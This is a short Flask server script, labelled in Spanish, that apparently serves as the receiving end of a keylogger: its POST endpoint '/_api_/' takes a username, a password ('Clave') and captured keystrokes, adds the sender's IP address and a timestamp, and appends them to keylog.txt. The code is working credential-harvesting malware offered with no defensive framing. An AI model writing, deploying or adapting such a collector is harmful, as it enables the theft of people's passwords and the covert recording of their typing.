from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/_api_/', methods=['POST'])
def log_keypress():
    data = request.get_json()
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    with open("keylog.txt", "a") as f:
        f.write(f"[{datetime.datetime.now()}] IP: {user_ip} | Usuario: {data.get('u')}, Clave: {data.get('p')}, Teclas: {data.get('k')}\n")
    return '', 204

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5050)
